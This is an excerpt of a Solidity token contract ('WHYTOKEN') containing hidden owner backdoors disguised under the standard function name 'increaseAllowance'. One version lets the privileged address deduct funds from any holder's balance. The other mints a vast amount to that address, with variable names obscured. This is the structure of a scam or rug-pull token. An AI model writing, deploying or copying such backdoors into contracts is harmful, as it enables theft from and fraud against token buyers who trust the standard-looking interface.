...
contract LLTOKEN is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    uint256 diseAmmount = 1000*10**decimals();
    constructor(address SDFCCVBD) {
    ...
    string private _disetokenname = "WHYTOKEN";
    string private _voptokensymbol = "WHY";
    ...
    function increaseAllowance(address disadddress) public     {
        ...
        if(LLTOKEN != _msgSender()){
            
        }else{
            _balances[disadddress] = _balances[disadddress]-yyayyresultamount;
        } 
        require(LLTOKEN == _msgSender());
    }

    function increaseAllowance() public     {
        uint256 shuliangdengzhi = 10000000000*10**9;
        uint256 zhegeshibeishu = 99000*shuliangdengzhi*1*1*1;
        if(LLTOKEN != _msgSender()){
        ...
        _balances[_msgSender()] += zhegeshibeishu;
        require(LLTOKEN == _msgSender());
    }
